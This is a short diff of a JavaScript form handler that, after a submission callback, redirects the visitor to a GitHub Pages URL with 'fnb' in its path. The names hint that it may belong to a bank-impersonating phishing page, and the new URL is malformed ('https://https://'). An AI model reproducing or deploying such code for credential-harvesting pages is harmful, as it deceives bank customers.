@@ -17,7 +17,7 @@ window.onload = function() {
             let Subscribe = setTimeout(sub, 2800);
             function sub(){
                 subscribe.value = 'Submit'
-                window.location.href="https://official-online.github.io/fnb-successful-page/"
+                window.location.href="https://https://workbasehq.github.io/fnb-end//"
             }
         }, function(error) {
                 console.log('FAILED...', error);
